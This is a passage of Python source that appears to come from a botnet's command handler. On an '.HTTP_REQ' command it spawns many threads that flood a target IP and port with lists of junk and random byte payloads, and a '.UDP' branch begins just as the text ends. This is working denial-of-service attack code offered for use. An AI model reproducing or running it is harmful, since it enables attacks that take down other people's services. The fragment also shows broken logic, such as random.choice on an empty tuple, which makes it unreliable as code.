            ...
            if command == ".HTTP_REQ":
                ...
                for _ in range(threads):
                    payload = random.choice((
                        ...
                        b'\x17\x00\x03\x2a' + b'\x00' * 100,
                        b'\x80\x00\x00\x00' + b'\x00' * 40,
                        b'\x00\x00\x00\x01\x00\x00\x00\x00' + b'\x00' * 56,
                        ...
                        b'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA',
                        b'\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D',
                        b'\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2A' + b'A' * 500,
                        ...
                        b'\xff\xff\xff\xff\xff\xff' + b'\x00' * 500,
                        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' * 32,
                        b'\xff\x00\xff\x00\xff\x00\xff\x00' * 64,
                        b'\xaa\x55\xaa\x55\xaa\x55\xaa\x55' * 32,
                        b'\xde\xad\xbe\xef\xca\xfe\xba\xbe' * 16,
                        b'\x00' * 1000,
                        b'\xff' * 1000,
                        b'\x00\xff' * 500,
                    )).encode() if isinstance(random.choice(()), str) else random.choice(())
                    threading.Thread(target=attack_sent1, args=(ip, port, secs, payload), daemon=True).start()
                    
                    payload = random.choice((
                        bytes([random.randint(0, 255) for _ in range(random.randint(32, 128))]),
                        os.urandom(random.randint(32, 128)),
                        b'\x00' * random.randint(32, 128),
                        b'\xff' * random.randint(32, 128),
                        b'\x55' * random.randint(32, 128),
                        b'\xaa' * random.randint(32, 128),
                    ))
                    threading.Thread(target=attack_sent1, args=(ip, port, secs, payload), daemon=True).start()
            elif command == '.UDP':
